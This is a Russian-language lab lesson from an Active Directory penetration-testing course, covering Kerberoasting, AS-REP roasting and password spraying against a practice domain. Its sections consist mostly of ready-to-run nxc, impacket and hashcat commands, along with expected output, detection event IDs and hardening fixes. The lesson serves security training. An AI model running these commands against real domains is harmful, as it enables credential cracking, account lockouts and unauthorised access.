# 11.2 — Kerberoasting, AS-REP, spraying

> **M11 · Этап 2 · 5 ч · 🟡 · артефакт:** `labs/m11-ad-attacks/l02-kerberos/`

## Цель

Получать и взламывать Kerberos-материал: TGS сервисных аккаунтов, AS-REP пользователей без pre-auth и пароли через аккуратный spraying.

## Результат

- Успешный Kerberoasting и восстановленный пароль сервисного аккаунта.
- AS-REP roast для `PreauthNotRequired`.
- Правильная (не блокирующая) стратегия spraying.

## Теория

### 1. Как работает Kerberos в двух словах

1. Клиент получает **TGT** в AS-REQ/AS-REP (аутентификация).
2. Клиент получает **TGS** в TGS-REQ/TGS-REP для конкретного сервиса.
3. TGS зашифрован ключом сервисного аккаунта (в RC4 — NTLM-хэшем).

Если у аккаунта есть SPN, любой доменный пользователь может запросить TGS. Часть TGS шифруется RC4 (тип 23), что позволяет офлайн-перебор.

### 2. Kerberoasting

```bash
nxc ldap 10.10.10.10 -u alice -p 'Password123!' --kerberoasting kerb.txt
impacket-GetUserSPNs lab.local/alice:'Password123!' -dc-ip 10.10.10.10 -request -outputfile kerb.txt
```

Взлом:

```bash
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
```

Если аккаунт поддерживает только AES, хэш сложнее, но всё ещё офлайн-перебор. `-m 19700` для AES128, `-m 19800` для AES256 (зависит от формата).

### 3. AS-REP roasting

Если у пользователя `UF_DONT_REQUIRE_PREAUTH`, можно запросить AS-REP без пароля и перебирать офлайн:

```bash
impacket-GetNPUsers lab.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

### 4. Spraying

Один-два пароля на много аккаунтов, с паузами, чтобы не заблокировать. Сначала проверьте политику блокировки:

```bash
nxc ldap 10.10.10.10 -u alice -p 'Password123!' --pass-pol
```

Стратегия:

- 1 пароль × все пользователи, затем пауза ≥ окна блокировки.
- Учитывайте `lockoutThreshold` и `lockoutObservationWindow`.
- `--continue-on-success`, `--no-bruteforce` где применимо.

```bash
nxc smb 10.10.10.10 -u users.txt -p 'Summer2026!' --continue-on-success
```

### 5. Что делать с найденным паролем

- Проверить, где аккаунт локальный админ (`Find-LocalAdminAccess`).
- Проверить членство в группах.
- Проверить, есть ли у аккаунта доступ к шагам дальше (ACL, delegation).

## Лаборатория

> В домене заранее созданы: `svc_sql` (SPN, слабый пароль), `svc_backup` (SPN), `olduser` (без pre-auth). Пароли — только в лабораторном словаре.

### 1. Политика

```bash
nxc ldap 10.10.10.10 -u alice -p 'Password123!' --pass-pol
```

Ожидаемо: `lockoutThreshold`, окно. Запишите: сколько попыток безопасно.

### 2. Kerberoasting

```bash
impacket-GetUserSPNs lab.local/alice:'Password123!' -dc-ip 10.10.10.10 -request
```

Ожидаемо: `$krb5tgs$23$*svc_sql$...`.

### 3. Взлом

```bash
hashcat -m 13100 -a 0 kerb.txt /usr/share/wordlists/rockyou.txt --force
```

Ожидаемо: пароль `Summer2026!` (пример). Зафиксируйте время.

### 4. AS-REP

```bash
impacket-GetNPUsers lab.local/ -usersfile <(nxc ldap 10.10.10.10 -u alice -p 'Password123!' --users | awk '{print $5}') -dc-ip 10.10.10.10 -format hashcat
```

Ожидаемо: хэш для `olduser`. Взломайте `-m 18200`.

### 5. Spraying (осторожно)

```bash
nxc smb 10.10.10.10 -u users.txt -p 'Winter2026!' --continue-on-success
```

Ожидаемо: 0–1 успех. Если 0 — не повторяйте сразу, дождитесь окна.

### 6. Проверка доступа

```bash
nxc smb 10.10.10.0/24 -u svc_sql -p 'Summer2026!' --shares
nxc winrm 10.10.10.0/24 -u svc_sql -p 'Summer2026!'
```

Ожидаемо: где-то есть локальный админ или WinRM.

## Атака и защита

- **Атака:** TGS/AS-REP → офлайн-перебор → доступ сервисного аккаунта.
- **Детект:** 4769 (Kerberos service ticket) с `Ticket Encryption Type 0x17`, аномальный объём; 4768 без pre-auth; 4625 массово; Honey-account.
- **Фикс:** длинные пароли сервисных аккаунтов (25+), gMSA, AES-only, запрет RC4, аудит SPN, отключение `DONT_REQUIRE_PREAUTH`, тонкая настройка lockout.

## Самопроверка

- [ ] Почему Kerberoasting возможен любому доменному пользователю?
- [ ] Чем AS-REP roasting отличается по предусловию?
- [ ] Почему AES-билет сложнее взломать?
- [ ] Как не заблокировать аккаунты при spraying?
- [ ] Какой Event ID показывает запрос TGS?

## Дальше

[11.3 — ACL abuse](l03-acl-abuse.md)
